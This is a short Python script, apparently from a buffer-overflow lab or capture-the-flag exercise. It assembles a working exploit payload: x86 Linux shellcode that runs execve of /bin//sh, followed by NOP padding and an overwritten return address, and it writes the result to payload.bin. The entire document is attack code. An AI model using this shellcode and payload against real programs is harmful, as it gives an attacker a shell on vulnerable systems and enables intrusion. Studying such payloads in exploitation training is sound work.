import struct

#0x80dacc00
#0xffffcf7c

code = bytearray([ 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80 ])

payload = code + bytearray([0x90] * 23) + struct.pack("I", 0x80dacc0)


with open("payload.bin", "wb") as out_file:
  out_file.write(payload)
